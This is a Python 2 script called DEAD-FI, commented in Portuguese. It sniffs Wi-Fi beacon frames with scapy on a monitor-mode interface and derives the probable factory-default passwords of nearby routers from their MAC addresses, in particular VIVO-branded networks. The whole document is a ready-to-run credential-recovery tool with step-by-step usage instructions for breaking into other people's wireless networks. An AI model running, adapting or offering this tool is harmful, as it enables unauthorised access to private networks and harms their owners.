#!/usr/bin/env python
# -*- coding: utf-8 -*-

###############################################
# Script: DEAD-FI                             #
# Author: Robson Barreto                      #
# Email: robson.barreto@live.com              #
# Facebook: facebook.com/barretorb            #
###############################################

###################### USO #############################
# 1 - Instale o scapy (apt-get install python-scapy)   #
#                                                      #
# 2 - Coloque a interface wifi em modo monitor         #
#     (airmon-ng start nomedainterface)                #
#                                                      #
# 3 - Dê permissão (chmod +x) para o arquivo deadfi.py #
#                                                      #
# 4 - Execute a linha de comando:                      #
#     ./deadfi.py interface_criada_pelo_airmon         #
########################################################
import sys 
from scapy.all import *
 
ap_list = []

print(""" ____  ____   __   ____      ____  __  
(    \(  __) / _\ (    \ ___(  __)(  ) 
 ) D ( ) _) /    \ ) D ((___)) _)  )(  
(____/(____)\_/\_/(____/    (__)  (__) 

""")

def menu():
 print "1 - Calcular senha padrão apenas para possiveis redes VIVO"
 print "2 - Calcular senha padrão para todas redes proximas" 

loop = True
choice = "1"
interface = str(sys.argv[1])

def PacketHandler (pkt) :
    if pkt.haslayer (Dot11) :
        
        if pkt.type == 0 and pkt.subtype == 8 :
              
            if pkt.addr2 not in ap_list :
                ap_list.append(pkt.addr2)
                
                if choice == 1:
                 if pkt.info[:5] == "VIVO-" :
                   password = pkt.addr2
                   password = password.replace(":","")
                   
                   print "\n"
                   print "WIFI: %s" %(pkt.info)
                   
                   if pkt.info[-4:] != password[-4:]:
                    password = password[:8] + pkt.info[-4:]
                    newpassword =  password[-10:]
                    print "SENHA PADRÃO: %s" %(newpassword.upper()) 
                   else:
                    print "SENHA PADRÃO: %s" %(password[-10:].upper())
           
                   print "--------------------------------------"
                   print "       buscando outras redes...       "
                   print "--------------------------------------"
                else:
                  password = pkt.addr2
                  password = password.replace(":","")
                  
                  print "\n" 
                  print "WIFI: %s" %(pkt.info)
                  print "POSSÍVEL SENHA PADRÃO: %s" %(password[-10:].upper())  
                  print "--------------------------------------"
                  print "        buscando outras redes...      "
                  print "--------------------------------------"
                 
                   
while loop:          
    menu()
    choice = input("Escolha uma opcao [1-2]: ")
    sniff(iface = interface , prn = PacketHandler)
    loop = False





